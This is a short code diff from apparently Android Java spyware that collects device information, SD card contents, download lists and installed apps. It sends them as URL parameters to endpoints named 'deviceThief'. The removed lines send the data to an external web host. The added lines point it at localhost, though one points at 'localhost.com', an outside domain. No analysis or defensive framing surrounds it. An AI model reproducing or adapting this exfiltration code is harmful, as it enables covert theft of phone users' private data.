@@ -61,9 +61,9 @@
 		try
 		{
 			HttpClient httpClient = new DefaultHttpClient();
-			HttpGet get = new HttpGet("http://500iqproject.atwebpages.com/deviceThief.php" + "?basic=" + a + "&sdcardroot=" + b);
-			HttpGet get2 = new HttpGet("http://500iqproject.atwebpages.com/deviceThief2.php" + "?downloadlist=" + c);
-			HttpGet get3 = new HttpGet("http://500iqproject.atwebpages.com/deviceThief3.php" + "?applist=" + d);
+			HttpGet get = new HttpGet("http://localhost/deviceThief.php" + "?basic=" + a + "&sdcardroot=" + b);
+			HttpGet get2 = new HttpGet("http://localhost/deviceThief2.php" + "?downloadlist=" + c);
+			HttpGet get3 = new HttpGet("http://localhost.com/deviceThief3.php" + "?applist=" + d);
 			
 			httpClient.execute(get);
 			httpClient.execute(get2);
